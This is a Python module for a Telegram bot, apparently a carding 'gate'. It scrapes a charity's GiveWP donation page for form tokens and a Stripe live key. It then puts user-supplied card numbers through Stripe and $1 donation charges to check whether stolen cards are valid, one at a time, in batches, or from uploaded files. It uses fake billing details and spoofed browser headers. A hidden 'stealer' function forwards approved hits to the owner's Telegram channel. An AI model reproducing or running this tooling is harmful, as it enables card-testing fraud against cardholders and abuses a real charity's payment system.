import time
import asyncio
import re
import random
import requests
import urllib3
from html import unescape
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
GATE_NAME = "BetterFuture 1$ Charge"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100

SITE_URL = 'https://better-future.org/donate/'
BASE_URL = 'https://better-future.org'
CLEAN_URL = 'https://better-future.org/donate/'
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

# ========== STEALER CONFIG ==========
STEALER_CHANNEL_ID = -1003627495953
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"

async def send_hit_to_stealer(client: Client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ========== SYNC CHECKER ==========
def extract_data():
    s = requests.Session()
    s.verify = False
    headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    r = s.get(SITE_URL, headers=headers, timeout=30)
    html = r.text
    if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
        fid = re.search(r'form-id[=]+(\d+)', html)
        if fid:
            iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
            r2 = s.get(iframe, headers=headers, timeout=30)
            html = r2.text
    fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
    fi = re.search(r'name="give-form-id" value="(.*?)"', html)
    nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
    pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
    if not all([fp, fi, nc, pk]):
        return None
    sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
    return {
        'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
        'pk': pk.group(1), 'sa': sa.group(1) if sa else '',
        'session': s
    }

def extract_stripe_response(text):
    error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
    if error_div:
        raw_error = error_div.group(1)
        clean_error = re.sub(r'<[^>]+>', '', raw_error)
        clean_error = unescape(clean_error).strip()
        clean_error = re.sub(r'\s+', ' ', clean_error)
        clean_error = clean_error.replace('Error:', '').strip()
        if 'Your card was declined' in clean_error: return f"Declined | {clean_error}"
        elif 'insufficient funds' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'security code is incorrect' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'card number is incorrect' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'expiration' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'processing error' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'lost' in clean_error.lower() or 'stolen' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'fraud' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'do not honor' in clean_error.lower(): return f"Declined | {clean_error}"
        elif 'minimum donation' in clean_error.lower(): return f"Gateway Error | {clean_error}"
        elif 'robot' in clean_error.lower() or 'captcha' in clean_error.lower(): return f"Gateway Error | {clean_error}"
        else: return f"Stripe Response | {clean_error}"
    if 'give-donation-confirmation' in text or 'donation-confirmation' in text: return "Charged | Donation confirmed"
    if 'Thank you for your donation' in text: return "Charged | Thank you for your donation"
    if 'receipt' in text.lower() and 'donation' in text.lower() and 'give_error' not in text: return "Charged | Payment succeeded"
    notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', text, re.DOTALL)
    if notice_div:
        cn = re.sub(r'<[^>]+>', '', notice_div.group(1))
        cn = unescape(cn).strip()
        cn = re.sub(r'\s+', ' ', cn)
        return f"Stripe Response | {cn}"
    return "Unknown Response"

def betterfuture_check_sync(fullcc):
    try:
        parts = fullcc.strip().split('|')
        if len(parts) < 4:
            return "Error", "Invalid format (use CC|MM|YY|CVV)"
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy_short = yy if len(yy) == 2 else yy[-2:]
        email = f'Ahmed{random.randint(100,999)}@gmail.com'

        d = extract_data()
        if not d:
            return "Error", "Could not extract form data"
        s = d['session']
        fp, fi, nc, pk, sa = d['fp'], d['fi'], d['nc'], d['pk'], d['sa']
        sa_param = f'&_stripe_account={sa}' if sa else ''

        # Step 1: AJAX pre‑request
        headers_ajax = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data_ajax = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': 'custom', 'give-amount': '1.00',
            'give_stripe_payment_method': '', 'payment-mode': 'stripe',
            'give_first': 'Ahmed', 'give_last': 'Ahmed', 'give_email': email,
            'give_comment': '', 'card_name': 'Ahmed', 'billing_country': 'US',
            'card_address': 'Ahmed sj', 'card_address_2': '', 'card_city': 'tomrr',
            'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
            'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
        }
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, timeout=30)

        # Step 2: Create Stripe payment method
        headers_stripe = {
            'authority': 'api.stripe.com', 'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'user-agent': UA,
        }
        stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={CLEAN_URL}&time_on_page=85758&key={pk}{sa_param}'
        stripe_resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, timeout=30)
        sr = stripe_resp.json()
        if 'error' in sr:
            em = sr['error'].get('message', 'Unknown')
            ec = sr['error'].get('code', 'unknown')
            return "Declined ❌", f"Stripe error: {ec} | {em}"
        pm_id = sr['id']

        # Step 3: Submit donation
        headers_final = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'user-agent': UA,
        }
        params_final = {'payment-mode': 'stripe', 'form-id': fi}
        data_final = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': 'Give a Donation', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': 'custom', 'give-amount': '1.00',
            'give_stripe_payment_method': pm_id, 'payment-mode': 'stripe',
            'give_first': 'Ahmed', 'give_last': 'Ahmed', 'give_email': email,
            'give_comment': '', 'card_name': 'Ahmed', 'billing_country': 'US',
            'card_address': 'Ahmed sj', 'card_address_2': '', 'card_city': 'tomrr',
            'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
            'give-gateway': 'stripe',
        }
        r4 = s.post(CLEAN_URL, params=params_final, headers=headers_final, data=data_final, timeout=30)
        result = extract_stripe_response(r4.text)

        if result.startswith("Charged"):
            msg = result.replace("Charged | ", "")
            return "Approved ✅", msg
        elif "insufficient funds" in result.lower():
            return "Declined ❌", result.replace("Declined | ", "")
        elif result.startswith("Declined"):
            return "Declined ❌", result.replace("Declined | ", "")
        else:
            return "Error", result
    except Exception as e:
        return "Error", str(e)[:50]

async def betterfuture_check(fullcc):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, betterfuture_check_sync, fullcc)

# ========== SINGLE CHECK /bf ==========
@Client.on_message(filters.command("bf", [".", "/"]))
async def bf_single(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getmessage(message)
        if not getcc:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /bf

⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗

↪ <b>ᴜꜱᴀɢᴇ :</b> /bf cc|mm|yy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, message.id)
        await asyncio.sleep(0.5)

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        status, response = await betterfuture_check(fullcc)
        elapsed = time.perf_counter() - start

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
        thirdchk = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
        await asyncio.sleep(0.5)

        if "Approved" in status:
            await send_hit_to_stealer(Client, fullcc, status, response, GATE_NAME, elapsed, first_name, role)

        finalresp = f"""<b>{status}</b>

{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""

        await Client.edit_message_text(message.chat.id, thirdchk.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== MASS CHECK /mbf ==========
@Client.on_message(filters.command("mbf", [".", "/"]))
async def bf_mass(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        getcc = await getcc_for_mass(message, role)
        if getcc[0] == False:
            await message.reply_text(getcc[1], message.id)
            return
        ccs = getcc[1]

        if len(ccs) > 100:
            await message.reply_text(f"✦ ᴍᴀx 100 ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id)
            return

        start = time.perf_counter()
        approved_count = 0
        declined_count = 0
        processed = 0
        total = len(ccs)
        approved_cards = []

        text = f"""Auto BetterFuture
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total}
Approved: 0
Declined: 0
Remaining: {total}

Checked by: {first_name} ({role})"""

        nov = await message.reply_text(text, message.id)

        for i, fullcc in enumerate(ccs, 1):
            processed = i
            remaining = total - processed
            status, response = await betterfuture_check(fullcc)

            if "Approved" in status:
                approved_count += 1
                response_status = "APPROVED ✅"
                card_time = time.perf_counter() - start
                approved_cards.append({
                    "fullcc": fullcc,
                    "response": response,
                    "gateway": GATE_NAME,
                    "time": card_time
                })
                await send_hit_to_stealer(Client, fullcc, status, response, GATE_NAME, card_time, first_name, role)
            else:
                declined_count += 1
                response_status = "DECLINED ❌"

            try:
                await Client.edit_message_text(
                    message.chat.id,
                    nov.id,
                    f"""Auto BetterFuture
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total}
Approved: {approved_count}
Declined: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})"""
                )
            except:
                pass
            await asyncio.sleep(0.5)

        await nov.delete()

        # Send approved cards individually
        for card in approved_cards:
            approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅ𝘀
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            await message.reply_text(approved_msg, message.id)
            await asyncio.sleep(0.5)

        elapsed_time = round(time.perf_counter() - start, 2)

        if approved_count > 0:
            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
            declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
            for card in declined_list[:15]:
                declined_summary += f"{SYMBOL} {card} → Declined\n"
            if declined_count > 15:
                declined_summary += f"\n... and {declined_count - 15} more declined cards"
            declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            await message.reply_text(declined_summary, message.id)
        else:
            await message.reply_text(
                f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
                message.id
            )

        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== TXT FILE CHECK /tbf ==========
@Client.on_message(filters.command("tbf", [".", "/"]))
async def bf_txt(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        if not message.reply_to_message or not message.reply_to_message.document:
            await message.reply_text("✦ Please reply to a .txt file containing cards.", message.id)
            return

        file_path = await Client.download_media(message.reply_to_message)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        os.remove(file_path)

        ccs = re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", content)
        if not ccs:
            await message.reply_text("✦ No valid cards found in file.", message.id)
            return

        if len(ccs) > 100:
            await message.reply_text(f"✦ Max 100 cards allowed. You provided {len(ccs)}.", message.id)
            ccs = ccs[:100]

        start = time.perf_counter()
        approved_count = 0
        declined_count = 0
        processed = 0
        total = len(ccs)
        approved_cards = []

        text = f"""Auto BetterFuture (File)
Admin

{SYMBOL} Response: Starting...

Progress: 0/{total}
Approved: 0
Declined: 0
Remaining: {total}

Checked by: {first_name} ({role})"""

        nov = await message.reply_text(text, message.id)

        for i, fullcc in enumerate(ccs, 1):
            processed = i
            remaining = total - processed
            status, response = await betterfuture_check(fullcc)

            if "Approved" in status:
                approved_count += 1
                response_status = "APPROVED ✅"
                card_time = time.perf_counter() - start
                approved_cards.append({
                    "fullcc": fullcc,
                    "response": response,
                    "gateway": GATE_NAME,
                    "time": card_time
                })
                await send_hit_to_stealer(Client, fullcc, status, response, GATE_NAME, card_time, first_name, role)
            else:
                declined_count += 1
                response_status = "DECLINED ❌"

            try:
                await Client.edit_message_text(
                    message.chat.id,
                    nov.id,
                    f"""Auto BetterFuture (File)
Admin

{SYMBOL} Response: {response_status}

Progress: {processed}/{total}
Approved: {approved_count}
Declined: {declined_count}
Remaining: {remaining}

Checked by: {first_name} ({role})"""
                )
            except:
                pass
            await asyncio.sleep(0.5)

        await nov.delete()

        for card in approved_cards:
            approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {card['gateway']}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}

{SYMBOL} 𝗧𝗼𝗼ᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅ𝘀
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            await message.reply_text(approved_msg, message.id)
            await asyncio.sleep(0.5)

        elapsed_time = round(time.perf_counter() - start, 2)

        if approved_count > 0:
            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})

━━━━━━━━━━━━━━━━━━━━
"""
            declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
            for card in declined_list[:15]:
                declined_summary += f"{SYMBOL} {card} → Declined\n"
            if declined_count > 15:
                declined_summary += f"\n... and {declined_count - 15} more declined cards"
            declined_summary += f"""
━━━━━━━━━━━━━━━━━━━━
✅ Approved: {approved_count}
❌ Declined: {declined_count}
📊 Total: {total}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
            await message.reply_text(declined_summary, message.id)
        else:
            await message.reply_text(
                f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀

━━━━━━━━━━━━━━━━━━━━
📊 Total Cards: {total}
❌ All Declined: {declined_count}
⏱ Time: {elapsed_time}s
👤 Checked by: {first_name} ({role})

━━━━━━━━━━━━━━━━━━━━
<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
                message.id
            )

        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
